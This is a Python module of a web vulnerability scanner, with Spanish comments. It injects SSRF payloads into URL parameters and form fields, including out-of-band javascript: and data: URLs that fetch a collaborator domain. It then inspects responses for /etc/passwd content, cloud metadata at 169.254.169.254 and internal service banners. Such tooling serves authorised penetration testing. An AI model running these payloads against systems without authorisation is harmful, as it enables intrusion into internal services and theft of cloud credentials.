import requests, random, sys, threading, time
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, quote
from parametizer.bounded_pool import run_threadpool_pending_bounded
from colorama import init, ansi
from parametizer.progress import update_progress, print_vulnerability
from parametizer.core.headers import get_headers
import os
import sys
import re
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from vulnerability_manager import vuln_manager
from bs4 import BeautifulSoup
import urllib3

init()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ssrf_params = [
    "url", "uri", "path", "dest", "redirect", "callback", "return", "next",
    "data", "reference", "site", "html", "continue", "domain", "page", "target",
    "feed", "host", "download", "image", "img", "link", "file", "proxy", "to",
    "out", "view", "remote", "forward"
]

def is_ssrf_response(text, oob_domain=None, payload=None):
    """
    Función mejorada para detectar SSRF basándose en contenido de respuesta
    Ahora más estricta para evitar falsos positivos, especialmente reflejo en JSON
    """
    if not text or len(text.strip()) == 0:
        return False
    
    text_lower = text.lower()
    
    # Validación OOB - la más confiable
    if oob_domain:
        oob_indicators = [
            oob_domain.lower(),
            oob_domain.replace('http://', '').replace('https://', '').lower(),
            oob_domain.split('/')[0].replace('http://', '').replace('https://', '').lower(),
            oob_domain.split('://')[-1].split('/')[0].lower() if '://' in oob_domain else oob_domain.lower()
        ]
        
        # Extraer dominio limpio para validaciones
        oob_clean = oob_domain.replace('http://', '').replace('https://', '').split('/')[0].lower()
        
        # Verificar que el dominio OOB aparezca en el contenido
        oob_found = False
        for ind in oob_indicators:
            if ind and len(ind) > 3 and ind in text_lower:
                oob_found = True
                break
        
        if not oob_found:
            return False
        
        # DETECCIÓN DE FALSOS POSITIVOS: Verificar si el dominio aparece solo reflejado en JSON/HTML
        # Verificar si el dominio aparece en campos JSON que indican reflejo (no SSRF real)
        # Buscar el dominio cerca de campos que indican reflejo
        is_false_positive_pattern = False
        
        # Buscar contexto alrededor del dominio OOB
        context_pattern = r'.{0,100}' + re.escape(oob_clean) + r'.{0,100}'
        contexts = re.findall(context_pattern, text_lower)
        
        for context in contexts:
            # Verificar si el contexto contiene campos que indican reflejo
            false_positive_indicators = [
                'originalurl',
                '"url"',
                'location.href',
                'window.location',
                '<input',
                '<a',
            ]
            
            # Si el contexto contiene un indicador de reflejo
            if any(ind in context for ind in false_positive_indicators):
                # Verificar que NO hay indicadores de error de conexión en el mismo contexto
                connection_error_indicators = [
                    'connection refused',
                    'connection timeout',
                    'connection failed',
                    'cannot connect',
                    'unable to connect',
                    'connection reset',
                    'dns error',
                    'network error',
                ]
                
                has_error = any(err in context for err in connection_error_indicators)
                
                if not has_error:
                    # Es un falso positivo - el dominio aparece reflejado sin errores de conexión
                    is_false_positive_pattern = True
                    break
        
        # Si coincide con patrón de falso positivo, verificar si hay indicadores de SSRF real
        if is_false_positive_pattern:
            # Buscar indicadores de que realmente se intentó hacer la petición
            connection_indicators = [
                r'connection\s+(refused|timeout|failed|error)',
                r'cannot\s+connect',
                r'unable\s+to\s+connect',
                r'connection\s+reset',
                r'no\s+route\s+to\s+host',
                r'dns\s+(error|failed|timeout)',
                r'network\s+(error|unreachable)',
                r'socket\s+(error|timeout)',
                r'getaddrinfo\s+failed',
            ]
            
            has_connection_error = False
            for indicator in connection_indicators:
                if re.search(indicator, text_lower):
                    has_connection_error = True
                    break
            
            # Si hay errores de conexión, podría ser SSRF real a pesar del reflejo
            if has_connection_error:
                return True
            else:
                # Es un falso positivo - solo reflejo en JSON/HTML
                return False
        
        # Si no es patrón de falso positivo, verificar otros indicadores
        # Verificar que no sea solo parte de una URL de redirección HTML normal
        if re.search(r'(href|location|redirect|url)\s*[:=]\s*["\']?[^"\']*' + re.escape(oob_clean), text_lower):
            # Podría ser SSRF si el payload está en el contenido Y hay indicadores de error
            if payload and payload.lower() in text_lower:
                # Verificar indicadores de error de conexión
                connection_indicators = ["connection", "timeout", "refused", "error", "cannot", "unable", "failed"]
                if any(ind in text_lower for ind in connection_indicators):
                    return True
            return False
        
        # Si aparece en el cuerpo del texto (no solo en atributos HTML/JSON), es más probable SSRF
        if not re.search(r'<[^>]*(href|src|action|location)\s*[:=]\s*[^>]*' + re.escape(oob_clean), text_lower):
            return True
    
    # Verificar contenido específico de archivos del sistema (muy confiable)
    file_indicators = [
        "root:x:0:0:",  # /etc/passwd - muy específico
        "daemon:x:1:1:",  # /etc/passwd
        "bin:x:2:2:",  # /etc/passwd
        "/bin/bash",  # /etc/passwd
        "/bin/sh",  # /etc/passwd
    ]
    
    # Si encontramos contenido de /etc/passwd, es muy probable SSRF
    if any(ind in text_lower for ind in file_indicators):
        # Verificar que no sea solo un comentario o ejemplo en el código
        if not any(comment in text_lower for comment in ["example", "comment", "test", "sample"]):
            return True
    
    # Verificar respuestas de metadata de cloud (muy específicas)
    cloud_metadata_patterns = [
        r'"instance-id"\s*:\s*"i-',  # AWS metadata JSON
        r'"availability-zone"\s*:\s*"[^"]*"',  # AWS metadata
        r'"accountid"\s*:\s*"[^"]*"',  # AWS metadata
        r'computeMetadata/v1/instance',  # GCP metadata
        r'project-number',  # GCP metadata
    ]
    
    for pattern in cloud_metadata_patterns:
        if re.search(pattern, text_lower):
            return True
    
    # Verificar respuestas de servicios internos (más estricto)
    # Solo si hay múltiples indicadores o contenido muy específico
    service_indicators = {
        "mysql": ["mysql", "mysqld", "mysql_native_password", "error 1045"],
        "redis": ["redis_version", "redis_mode", "used_memory_human"],
        "postgresql": ["postgresql", "postgres", "pg_"],
        "mongodb": ["mongodb", "mongo", "ismaster"],
        "ssh": ["ssh-", "openssh", "publickey"],
    }
    
    found_services = []
    for service, indicators in service_indicators.items():
        if any(ind in text_lower for ind in indicators):
            found_services.append(service)
    
    # Solo considerar SSRF si encontramos contenido específico de servicios
    # y no es solo una mención en texto HTML normal
    if found_services:
        # Verificar que no sea solo texto HTML/documentación
        html_tags = text_lower.count('<') + text_lower.count('>')
        text_ratio = len(text_lower) / max(html_tags, 1)
        
        # Si hay mucho HTML pero poco contenido de servicio, probablemente es falso positivo
        if html_tags > 10 and text_ratio < 50:
            return False
        
        # Si hay múltiples servicios o contenido muy específico, es probable SSRF
        if len(found_services) >= 2:
            return True
        
        # Si hay un servicio y el payload está relacionado, es probable SSRF
        if payload:
            payload_lower = payload.lower()
            if any(service in payload_lower for service in found_services):
                return True
    
    # Indicadores básicos - solo si hay múltiples y son muy específicos
    basic_indicators = {
        "169.254.169.254": ["169.254.169.254", "169.254"],  # AWS metadata - muy específico
        "127.0.0.1": ["127.0.0.1", "localhost"],  # Localhost
        "metadata": ["metadata", "meta-data", "user-data"],  # Cloud metadata
    }
    
    found_basic = []
    for key, patterns in basic_indicators.items():
        if any(pattern in text_lower for pattern in patterns):
            found_basic.append(key)
    
    # Validación SIN OOB - debe ser más estricta para evitar falsos positivos
    if not oob_domain:
        # Sin OOB, necesitamos evidencia más fuerte
        # 1. Contenido de archivos del sistema (ya verificado arriba)
        # 2. Metadata de cloud (ya verificado arriba)
        # 3. Servicios internos con múltiples indicadores (ya verificado arriba)
        # 4. Múltiples indicadores básicos + contenido específico
        
        # Solo considerar SSRF sin OOB si hay múltiples indicadores básicos Y contenido específico
        if len(found_basic) >= 2:
            # Verificar que no sea solo una página de error genérica
            error_indicators = ["404", "not found", "error", "forbidden", "access denied"]
            if not any(err in text_lower[:200] for err in error_indicators):
                # Verificar que hay contenido específico, no solo menciones
                # Buscar patrones específicos de respuestas de servicios
                specific_patterns = [
                    r'connection\s+(refused|timeout|failed)',
                    r'cannot\s+connect',
                    r'unable\s+to\s+connect',
                    r'connection\s+reset',
                    r'no\s+route\s+to\s+host',
                ]
                if any(re.search(pattern, text_lower) for pattern in specific_patterns):
                    return True
                
                # O si hay contenido de servicios internos
                if found_services:
                    return True
        
        # Si el payload está reflejado, verificar que no sea solo en HTML
        if payload:
            payload_clean = payload.lower().replace('http://', '').replace('https://', '').replace('file://', '')
            if payload_clean in text_lower and len(found_basic) >= 1:
                # Verificar que no sea solo en una URL de redirección HTML
                if not re.search(r'<[^>]*(href|src|action|location)\s*[:=]\s*[^>]*' + re.escape(payload_clean), text_lower):
                    # Verificar que hay indicadores de que se intentó hacer la petición
                    connection_indicators = ["connection", "timeout", "refused", "error", "cannot", "unable", "failed"]
                    if any(ind in text_lower for ind in connection_indicators):
                        return True
    
    # Validación CON OOB - puede ser menos estricta porque OOB es evidencia confiable
    else:
        # Con OOB, si hay múltiples indicadores básicos, es probable SSRF
        if len(found_basic) >= 2:
            # Verificar que no sea solo una página de error genérica
            error_indicators = ["404", "not found", "error", "forbidden", "access denied"]
            if not any(err in text_lower[:200] for err in error_indicators):
                return True
        
        # Si el payload está reflejado en la respuesta con OOB
        if payload:
            payload_clean = payload.lower().replace('http://', '').replace('https://', '').replace('file://', '')
            if payload_clean in text_lower and len(found_basic) >= 1:
                # Verificar que no sea solo en una URL de redirección HTML
                if not re.search(r'<[^>]*(href|src|action|location)\s*[:=]\s*[^>]*' + re.escape(payload_clean), text_lower):
                    return True
    
    return False

def ssrf(urip, urif, wordlist, urls_vulnerables, threads, custom_headers=None, random_agent=False, oob_domain=None):
    print('\033[1;36m<<<<<<<<<<<<\033[0m Testing Server Side Request Forgery \033[1;36m>>>>>>>>>>>>>\033[0m')
    print()
    
    # Filtrar payloads OOB de la wordlist (solo deben usarse si se proporciona -obd)
    # Dominios OOB comunes que no deben estar en la wordlist por defecto
    oob_domain_patterns = [
        r'\.oob\.(net|red|site|pro)',
        r'oastify\.com',
        r'burpcollaborator\.net',
        r'interactsh\.com',
        r'canarytokens\.com',
        r'requestbin\.(com|net)',
        r'webhook\.site',
    ]
    
    # Filtrar payloads que contengan dominios OOB
    filtered_wordlist = []
    for payload in wordlist:
        payload_lower = payload.lower()
        is_oob_payload = False
        for pattern in oob_domain_patterns:
            if re.search(pattern, payload_lower):
                is_oob_payload = True
                break
        if not is_oob_payload:
            filtered_wordlist.append(payload)
    
    wordlist = filtered_wordlist
    
    # Inicializar payloads OOB
    oob_payloads = []
    
    if oob_domain:
        if not oob_domain.startswith("http"):
            oob_domain = "http://" + oob_domain
        
        # Crear payloads OOB más efectivos
        oob_payloads = [
            oob_domain,
            f"{oob_domain}/test",
            f"{oob_domain}/?test=1",
            f"{oob_domain}/#test",
            f"http://{oob_domain.replace('http://', '').replace('https://', '')}",
            f"https://{oob_domain.replace('http://', '').replace('https://', '')}",
            f"//{oob_domain.replace('http://', '').replace('https://', '')}",
            f"\\\\{oob_domain.replace('http://', '').replace('https://', '')}",
            f"javascript:fetch('{oob_domain}')",
            f"data:text/html,<script>fetch('{oob_domain}')</script>"
        ]
        
        # Agregar payloads OOB al inicio de la wordlist para priorizarlos
        wordlist = oob_payloads + wordlist

    total_tasks = (len(urip) * 2 + len(urif)) * len(wordlist)
    current = 0
    lock = threading.Lock()
    found = []
    seen_urls = set()
    
    # Cache para baselines y endpoints vulnerables
    baseline_cache = {}
    form_cache = {}
    stdout_lock = threading.Lock()

    try:
        from scanners.ban_detector import get_ban_detector
    except ImportError:
        from ban_detector import get_ban_detector
    ban = get_ban_detector()

    def test_url(url, payload):
        nonlocal current
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)
        headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)

        if not params:
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        for param in params:
            if param.lower() not in ssrf_params:
                continue

            if vuln_manager.should_skip_url(base, param):
                with lock:
                    current += 1
                    update_progress(current, total_tasks)
                return

            data = {k: payload if k == param else "TEST123" for k in params}
            base_data = {k: "TEST123" for k in params}
            
            # Cache de baseline para GET
            baseline_key = f"GET-{base}-{','.join(params.keys())}"
            if baseline_key not in baseline_cache:
                try:
                    base_r = requests.get(base, params=base_data, headers=headers, verify=False, timeout=5)
                    if base_r.status_code == 200:
                        baseline_cache[baseline_key] = base_r.text
                    else:
                        baseline_cache[baseline_key] = ""
                except requests.exceptions.Timeout:
                    baseline_cache[baseline_key] = ""
                except requests.exceptions.RequestException:
                    baseline_cache[baseline_key] = ""
                except Exception:
                    baseline_cache[baseline_key] = ""
            base_content = baseline_cache[baseline_key]
            
            if ban.is_banned(parsed.netloc):
                with lock:
                    current += 1
                    update_progress(current, total_tasks)
                return

            try:
                start_time = time.time()
                r = requests.get(base, params=data, headers=headers, verify=False, timeout=5)
                end_time = time.time()
                elapsed = end_time - start_time
                ban.record(parsed.netloc, r.status_code, r, base)

                # Solo procesar si la respuesta es exitosa Y NO es un bloqueo (403, 429, etc.)
                if r.status_code == 200:
                    # Validación mejorada: verificar diferencias significativas
                    content_diff = abs(len(r.text) - len(base_content))
                    content_similarity = 0
                    if base_content and r.text:
                        # Calcular similitud básica
                        common_chars = sum(1 for a, b in zip(base_content[:500], r.text[:500]) if a == b)
                        content_similarity = common_chars / max(len(base_content[:500]), len(r.text[:500]), 1)
                    
                    # Verificar SSRF con validación más estricta
                    is_ssrf = is_ssrf_response(r.text, oob_domain, payload)
                    
                    # Solo considerar SSRF si:
                    # 1. La función de validación confirma SSRF
                    # 2. El contenido es diferente al baseline
                    # 3. La diferencia es significativa (más de 50 caracteres o similitud < 0.8)
                    # 4. No es solo una redirección HTML normal
                    if (
                        is_ssrf
                        and r.text != base_content
                        and (content_diff > 50 or content_similarity < 0.8)
                    ):
                        # Verificación adicional: evitar falsos positivos en parámetros de redirección
                        # Si el parámetro es "continue", "redirect", "return", etc., ser más estricto
                        redirect_params = ["continue", "redirect", "return", "next", "callback"]
                        if param.lower() in redirect_params:
                            # Para parámetros de redirección, verificar que realmente se hizo una petición
                            # y no solo se reflejó el valor en HTML
                            # Si el payload aparece solo en atributos HTML (href, location), podría ser falso positivo
                            if re.search(r'<[^>]*(href|src|action|location)\s*[:=]\s*[^>]*' + re.escape(payload[:20]), r.text, re.IGNORECASE):
                                # Verificar que también hay contenido que indica que se hizo la petición
                                if not any(ind in r.text.lower() for ind in ["connection", "timeout", "refused", "error", "cannot", "unable"]):
                                    # Probablemente es solo una redirección, no SSRF real
                                    pass
                                else:
                                    # Hay indicadores de que se intentó hacer la petición
                                    key = f"{base}|{param}"
                                    with lock:
                                        if key not in seen_urls:
                                            seen_urls.add(key)
                                            with stdout_lock:
                                                is_oob = oob_domain and (oob_domain in payload or any(oob_payload in payload for oob_payload in oob_payloads))
                                                tag = "[OOB]" if is_oob else "[GET]"
                                                print_vulnerability(f"\033[1;32m{tag} [VULNERABLE]\033[0m {base}?{param}={quote(payload)}")
                                            
                                            urls_vulnerables.append(f"{base}?{param}={quote(payload)}")
                                            found.append(key)
                                            vuln_manager.mark_as_exploited(base, param)
                                            break
                            else:
                                # El payload no está solo en atributos HTML, es más probable SSRF
                                key = f"{base}|{param}"
                                with lock:
                                    if key not in seen_urls:
                                        seen_urls.add(key)
                                        with stdout_lock:
                                            is_oob = oob_domain and (oob_domain in payload or any(oob_payload in payload for oob_payload in oob_payloads))
                                            tag = "[OOB]" if is_oob else "[GET]"
                                            print_vulnerability(f"\033[1;32m{tag} [VULNERABLE]\033[0m {base}?{param}={quote(payload)}")
                                        
                                        urls_vulnerables.append(f"{base}?{param}={quote(payload)}")
                                        found.append(key)
                                        vuln_manager.mark_as_exploited(base, param)
                                        break
                        else:
                            # Para otros parámetros, aplicar validación normal
                            key = f"{base}|{param}"
                            with lock:
                                if key not in seen_urls:
                                    seen_urls.add(key)
                                    with stdout_lock:
                                        is_oob = oob_domain and (oob_domain in payload or any(oob_payload in payload for oob_payload in oob_payloads))
                                        tag = "[OOB]" if is_oob else "[GET]"
                                        print_vulnerability(f"\033[1;32m{tag} [VULNERABLE]\033[0m {base}?{param}={quote(payload)}")
                                    
                                    urls_vulnerables.append(f"{base}?{param}={quote(payload)}")
                                    found.append(key)
                                    vuln_manager.mark_as_exploited(base, param)
                                    break
                elif r.status_code in [403, 429, 451, 503]:
                    # Ignorar respuestas de bloqueo - NO son vulnerabilidades válidas
                    # 403: Forbidden (WAF bloqueando)
                    # 429: Too Many Requests (Rate limiting)
                    # 451: Unavailable For Legal Reasons
                    # 503: Service Unavailable
                    pass
                elif elapsed > 5 and r.status_code == 200:
                    # Solo considerar TIME-BASED si la respuesta es exitosa (200)
                    # Verificar que el payload realmente pueda causar delay
                    payload_lower = payload.lower()
                    delay_indicators = [
                        "127.0.0.1:", "localhost:", "0.0.0.0:",  # Con puerto específico
                        "169.254.", "10.", "192.168.", "172.",    # IPs internas
                        "metadata", "instance-data", "cloud"       # Cloud metadata
                    ]
                    
                    # Solo marcar como TIME-BASED si el payload puede causar delay real
                    if any(ind in payload_lower for ind in delay_indicators):
                        key = f"{base}|{param}"
                        with lock:
                            if key not in seen_urls:
                                seen_urls.add(key)
                                # Salida sincronizada usando la nueva función
                                with stdout_lock:
                                    tag = "[OOB]" if oob_domain and payload.startswith(oob_domain) else "[GET]"
                                    print_vulnerability(f"\033[1;32m{tag} [POTENTIAL SSRF - TIME]\033[0m {base}?{param}={quote(payload)}")
                                
                                urls_vulnerables.append(f"{base}?{param}={quote(payload)}")
                                found.append(key)
                                vuln_manager.mark_as_exploited(base, param)
                                break
            except requests.exceptions.Timeout:
                pass
            except requests.exceptions.RequestException:
                pass
            except Exception:
                pass
                
        with lock:
            current += 1
            update_progress(current, total_tasks)

    def test_post(url, payload):
        nonlocal current
        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        params = parse_qs(parsed.query)
        headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)

        if not params:
            with lock:
                current += 1
                update_progress(current, total_tasks)
            return

        for param in params:
            if param.lower() not in ssrf_params:
                continue

            if vuln_manager.should_skip_url(base, param):
                with lock:
                    current += 1
                    update_progress(current, total_tasks)
                return

            data = {k: payload if k == param else "TEST123" for k in params}
            base_data = {k: "TEST123" for k in params}
            
            # Cache de baseline para POST
            baseline_key = f"POST-{base}-{','.join(params.keys())}"
            if baseline_key not in baseline_cache:
                try:
                    base_r = requests.post(base, data=base_data, headers=headers, verify=False, timeout=5)
                    if base_r.status_code == 200:
                        baseline_cache[baseline_key] = base_r.text
                    else:
                        baseline_cache[baseline_key] = ""
                except requests.exceptions.Timeout:
                    baseline_cache[baseline_key] = ""
                except requests.exceptions.RequestException:
                    baseline_cache[baseline_key] = ""
                except Exception:
                    baseline_cache[baseline_key] = ""
            base_content = baseline_cache[baseline_key]
            
            try:
                start_time = time.time()
                r = requests.post(base, data=data, headers=headers, verify=False, timeout=5)
                end_time = time.time()
                elapsed = end_time - start_time

                # Solo procesar si la respuesta es exitosa Y NO es un bloqueo (403, 429, etc.)
                if r.status_code == 200:
                    # Validación mejorada: verificar diferencias significativas
                    content_diff = abs(len(r.text) - len(base_content))
                    content_similarity = 0
                    if base_content and r.text:
                        # Calcular similitud básica
                        common_chars = sum(1 for a, b in zip(base_content[:500], r.text[:500]) if a == b)
                        content_similarity = common_chars / max(len(base_content[:500]), len(r.text[:500]), 1)
                    
                    # Verificar SSRF con validación más estricta
                    is_ssrf = is_ssrf_response(r.text, oob_domain, payload)
                    
                    # Solo considerar SSRF si:
                    # 1. La función de validación confirma SSRF
                    # 2. El contenido es diferente al baseline
                    # 3. La diferencia es significativa (más de 50 caracteres o similitud < 0.8)
                    if (
                        is_ssrf
                        and r.text != base_content
                        and (content_diff > 50 or content_similarity < 0.8)
                    ):
                        # Verificación adicional: evitar falsos positivos en parámetros de redirección
                        redirect_params = ["continue", "redirect", "return", "next", "callback"]
                        if param.lower() in redirect_params:
                            # Para parámetros de redirección, verificar que realmente se hizo una petición
                            if re.search(r'<[^>]*(href|src|action|location)\s*[:=]\s*[^>]*' + re.escape(payload[:20]), r.text, re.IGNORECASE):
                                # Verificar que también hay contenido que indica que se hizo la petición
                                if not any(ind in r.text.lower() for ind in ["connection", "timeout", "refused", "error", "cannot", "unable"]):
                                    # Probablemente es solo una redirección, no SSRF real
                                    pass
                                else:
                                    key = f"{base}|{param}"
                                    with lock:
                                        if key not in seen_urls:
                                            seen_urls.add(key)
                                            with stdout_lock:
                                                is_oob = oob_domain and (oob_domain in payload or any(oob_payload in payload for oob_payload in oob_payloads))
                                                tag = "[OOB]" if is_oob else "[POST]"
                                                print_vulnerability(f"\033[1;32m{tag} [VULNERABLE]\033[0m {base}?{param}={quote(payload)}")
                                            
                                            urls_vulnerables.append(f"{base}?{param}={quote(payload)}")
                                            found.append(key)
                                            vuln_manager.mark_as_exploited(base, param)
                                            break
                            else:
                                key = f"{base}|{param}"
                                with lock:
                                    if key not in seen_urls:
                                        seen_urls.add(key)
                                        with stdout_lock:
                                            is_oob = oob_domain and (oob_domain in payload or any(oob_payload in payload for oob_payload in oob_payloads))
                                            tag = "[OOB]" if is_oob else "[POST]"
                                            print_vulnerability(f"\033[1;32m{tag} [VULNERABLE]\033[0m {base}?{param}={quote(payload)}")
                                        
                                        urls_vulnerables.append(f"{base}?{param}={quote(payload)}")
                                        found.append(key)
                                        vuln_manager.mark_as_exploited(base, param)
                                        break
                        else:
                            key = f"{base}|{param}"
                            with lock:
                                if key not in seen_urls:
                                    seen_urls.add(key)
                                    with stdout_lock:
                                        is_oob = oob_domain and (oob_domain in payload or any(oob_payload in payload for oob_payload in oob_payloads))
                                        tag = "[OOB]" if is_oob else "[POST]"
                                        print_vulnerability(f"\033[1;32m{tag} [VULNERABLE]\033[0m {base}?{param}={quote(payload)}")
                                    
                                    urls_vulnerables.append(f"{base}?{param}={quote(payload)}")
                                    found.append(key)
                                    vuln_manager.mark_as_exploited(base, param)
                                    break
                elif r.status_code in [403, 429, 451, 503]:
                    # Ignorar respuestas de bloqueo - NO son vulnerabilidades válidas
                    # 403: Forbidden (WAF bloqueando)
                    # 429: Too Many Requests (Rate limiting)
                    # 451: Unavailable For Legal Reasons
                    # 503: Service Unavailable
                    pass
                elif elapsed > 5 and r.status_code == 200:
                    # Solo considerar TIME-BASED si la respuesta es exitosa (200)
                    # Verificar que el payload realmente pueda causar delay
                    payload_lower = payload.lower()
                    delay_indicators = [
                        "127.0.0.1:", "localhost:", "0.0.0.0:",  # Con puerto específico
                        "169.254.", "10.", "192.168.", "172.",    # IPs internas
                        "metadata", "instance-data", "cloud"       # Cloud metadata
                    ]
                    
                    # Solo marcar como TIME-BASED si el payload puede causar delay real
                    if any(ind in payload_lower for ind in delay_indicators):
                        key = f"{base}|{param}"
                        with lock:
                            if key not in seen_urls:
                                seen_urls.add(key)
                                # Salida sincronizada usando la nueva función
                                with stdout_lock:
                                    tag = "[OOB]" if oob_domain and payload.startswith(oob_domain) else "[POST]"
                                    print_vulnerability(f"\033[1;32m{tag} [POTENTIAL SSRF - TIME]\033[0m {base}?{param}={quote(payload)}")
                                
                                urls_vulnerables.append(f"{base}?{param}={quote(payload)}")
                                found.append(key)
                                vuln_manager.mark_as_exploited(base, param)
                                break
            except requests.exceptions.Timeout:
                pass
            except requests.exceptions.RequestException:
                pass
            except Exception:
                pass
                
        with lock:
            current += 1
            update_progress(current, total_tasks)

    def test_form(url, payload):
        nonlocal current
        headers = get_headers(random_agent=random_agent, custom_headers=custom_headers)
        try:
            # Cache de formularios para evitar re-parsing
            if url not in form_cache:
                r = requests.get(url, headers=headers, timeout=7)
                soup = BeautifulSoup(r.text, 'html.parser')
                forms = soup.find_all('form')
                form_cache[url] = forms
            else:
                forms = form_cache[url]

            for form in forms:
                action = form.get('action') or url
                method = form.get('method', 'get').lower()
                inputs = form.find_all('input')
                data = {}

                for inp in inputs:
                    name = inp.get('name')
                    if name and name.lower() in ssrf_params:
                        data[name] = payload

                if not data:
                    continue

                target = urljoin(url, action)
                form_param = list(data.keys())[0]
                if any(vuln_manager.should_skip_url(target, p) for p in data):
                    continue
                if method == "post":
                    res = requests.post(target, data=data, headers=headers, timeout=5)
                else:
                    res = requests.get(target, params=data, headers=headers, timeout=5)

                # Solo procesar si la respuesta es exitosa Y NO es un bloqueo (403, 429, etc.)
                if res.status_code == 200:
                    # Validación mejorada para formularios
                    is_ssrf = is_ssrf_response(res.text, oob_domain, payload)
                    
                    if (
                        is_ssrf
                        and abs(len(res.text)) > 50
                    ):
                        # Verificación adicional para formularios
                        redirect_params = ["continue", "redirect", "return", "next", "callback"]
                        
                        if form_param and form_param.lower() in redirect_params:
                            # Verificar que no sea solo una redirección HTML
                            if re.search(r'<[^>]*(href|src|action|location)\s*[:=]\s*[^>]*' + re.escape(payload[:20]), res.text, re.IGNORECASE):
                                if not any(ind in res.text.lower() for ind in ["connection", "timeout", "refused", "error", "cannot", "unable"]):
                                    # Probablemente es solo una redirección
                                    pass
                                else:
                                    with lock:
                                        key = f"{target}|{form_param}"
                                        if key not in seen_urls:
                                            seen_urls.add(key)
                                            with stdout_lock:
                                                is_oob = oob_domain and (oob_domain in payload or any(oob_payload in payload for oob_payload in oob_payloads))
                                                tag = "[OOB]" if is_oob else "[FORM]"
                                                print_vulnerability(f"\033[1;32m{tag} [VULNERABLE]\033[0m {target}")
                                                print_vulnerability(str(data))
                                            
                                            urls_vulnerables.append(f"{target}")
                                            found.append(key)
                                            vuln_manager.mark_as_exploited(target, form_param)
                            else:
                                with lock:
                                    key = f"{target}|{form_param}"
                                    if key not in seen_urls:
                                        seen_urls.add(key)
                                        with stdout_lock:
                                            is_oob = oob_domain and (oob_domain in payload or any(oob_payload in payload for oob_payload in oob_payloads))
                                            tag = "[OOB]" if is_oob else "[FORM]"
                                            print_vulnerability(f"\033[1;32m{tag} [VULNERABLE]\033[0m {target}")
                                            print_vulnerability(str(data))
                                        
                                        urls_vulnerables.append(f"{target}")
                                        found.append(key)
                                        vuln_manager.mark_as_exploited(target, form_param)
                        else:
                            with lock:
                                key = f"{target}|{form_param}"
                                if key not in seen_urls:
                                    seen_urls.add(key)
                                    with stdout_lock:
                                        is_oob = oob_domain and (oob_domain in payload or any(oob_payload in payload for oob_payload in oob_payloads))
                                        tag = "[OOB]" if is_oob else "[FORM]"
                                        print_vulnerability(f"\033[1;32m{tag} [VULNERABLE]\033[0m {target}")
                                        print_vulnerability(str(data))
                                    
                                    urls_vulnerables.append(f"{target}")
                                    found.append(key)
                                    vuln_manager.mark_as_exploited(target, form_param)
                elif res.status_code in [403, 429, 451, 503]:
                    # Ignorar respuestas de bloqueo - NO son vulnerabilidades válidas
                    # 403: Forbidden (WAF bloqueando)
                    # 429: Too Many Requests (Rate limiting)
                    # 451: Unavailable For Legal Reasons
                    # 503: Service Unavailable
                    pass
        except requests.exceptions.Timeout:
            pass  # Skip timeouts silently
        except requests.exceptions.RequestException:
            pass  # Skip other request errors
        except Exception:
            pass  # Skip any other errors
            
        with lock:
            current += 1
            update_progress(current, total_tasks)

    # Crear tareas de manera más eficiente
    def _iter_ssrf_tasks():
        for url in urip:
            for payload in wordlist:
                yield (test_url, url, payload)
                yield (test_post, url, payload)
        for url in urif:
            for payload in wordlist:
                yield (test_form, url, payload)

    run_threadpool_pending_bounded(_iter_ssrf_tasks(), threads)

    # Limpiar salida final
    with stdout_lock:
        sys.stdout.write('\r' + ansi.clear_line())
        sys.stdout.flush()
    print()
    if found:
        print(f'\033[1;36m[+] Found {len(found)} potential SSRF vulnerabilities\033[0m')
    else:
        print('\033[1;31m[-] No SSRF vulnerabilities found\033[0m')
    print()
    
    return urls_vulnerables
